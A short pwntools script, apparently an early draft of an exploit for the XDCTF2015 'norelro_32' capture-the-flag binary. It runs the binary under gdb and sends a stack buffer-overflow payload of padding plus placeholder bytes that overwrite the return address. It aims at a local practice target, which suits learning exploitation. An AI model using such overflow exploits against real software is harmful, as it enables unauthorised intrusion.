from pwn import *

elf = ELF('norelro_32')
io = process(elf.path)
rop = ROP('norelro_32')

gdb.attach(io,"b * 0x080484fe")

io.recvuntil('Welcome to XDCTF2015~!')
payload = flat(['a'*0x6c+'bbbb'+'cccc'])
print(payload)
io.sendline(payload)
io.interactive()